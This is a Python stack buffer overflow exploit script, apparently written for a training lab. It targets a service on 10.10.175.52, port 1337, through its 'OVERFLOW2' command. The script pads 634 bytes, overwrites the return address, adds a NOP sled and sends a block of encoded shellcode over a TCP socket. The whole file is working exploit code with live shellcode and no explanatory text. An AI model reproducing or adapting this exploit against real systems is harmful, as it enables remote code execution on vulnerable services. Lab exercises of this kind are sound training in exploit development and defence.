#!/usr/bin/env python3
import socket

ip = "10.10.175.52"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xfc\xbb\x2d\x4d\x96\xd1\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xd1\xa5\x14"
"\xd1\x29\x36\x79\x5b\xcc\x07\xb9\x3f\x85\x38\x09\x4b\xcb"
"\xb4\xe2\x19\xff\x4f\x86\xb5\xf0\xf8\x2d\xe0\x3f\xf8\x1e"
"\xd0\x5e\x7a\x5d\x05\x80\x43\xae\x58\xc1\x84\xd3\x91\x93"
"\x5d\x9f\x04\x03\xe9\xd5\x94\xa8\xa1\xf8\x9c\x4d\x71\xfa"
"\x8d\xc0\x09\xa5\x0d\xe3\xde\xdd\x07\xfb\x03\xdb\xde\x70"
"\xf7\x97\xe0\x50\xc9\x58\x4e\x9d\xe5\xaa\x8e\xda\xc2\x54"
"\xe5\x12\x31\xe8\xfe\xe1\x4b\x36\x8a\xf1\xec\xbd\x2c\xdd"
"\x0d\x11\xaa\x96\x02\xde\xb8\xf0\x06\xe1\x6d\x8b\x33\x6a"
"\x90\x5b\xb2\x28\xb7\x7f\x9e\xeb\xd6\x26\x7a\x5d\xe6\x38"
"\x25\x02\x42\x33\xc8\x57\xff\x1e\x85\x94\x32\xa0\x55\xb3"
"\x45\xd3\x67\x1c\xfe\x7b\xc4\xd5\xd8\x7c\x2b\xcc\x9d\x12"
"\xd2\xef\xdd\x3b\x11\xbb\x8d\x53\xb0\xc4\x45\xa3\x3d\x11"
"\xc9\xf3\x91\xca\xaa\xa3\x51\xbb\x42\xa9\x5d\xe4\x73\xd2"
"\xb7\x8d\x1e\x29\x50\xb8\xd8\x26\xa1\xd4\xe6\x48\xb0\x78"
"\x6e\xae\xd8\x90\x26\x79\x75\x08\x63\xf1\xe4\xd5\xb9\x7c"
"\x26\x5d\x4e\x81\xe9\x96\x3b\x91\x9e\x56\x76\xcb\x09\x68"
"\xac\x63\xd5\xfb\x2b\x73\x90\xe7\xe3\x24\xf5\xd6\xfd\xa0"
"\xeb\x41\x54\xd6\xf1\x14\x9f\x52\x2e\xe5\x1e\x5b\xa3\x51"
"\x05\x4b\x7d\x59\x01\x3f\xd1\x0c\xdf\xe9\x97\xe6\x91\x43"
"\x4e\x54\x78\x03\x17\x96\xbb\x55\x18\xf3\x4d\xb9\xa9\xaa"
"\x0b\xc6\x06\x3b\x9c\xbf\x7a\xdb\x63\x6a\x3f\xeb\x29\x36"
"\x16\x64\xf4\xa3\x2a\xe9\x07\x1e\x68\x14\x84\xaa\x11\xe3"
"\x94\xdf\x14\xaf\x12\x0c\x65\xa0\xf6\x32\xda\xc1\xd2\x32"
"\xdc\x3d\xdd")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
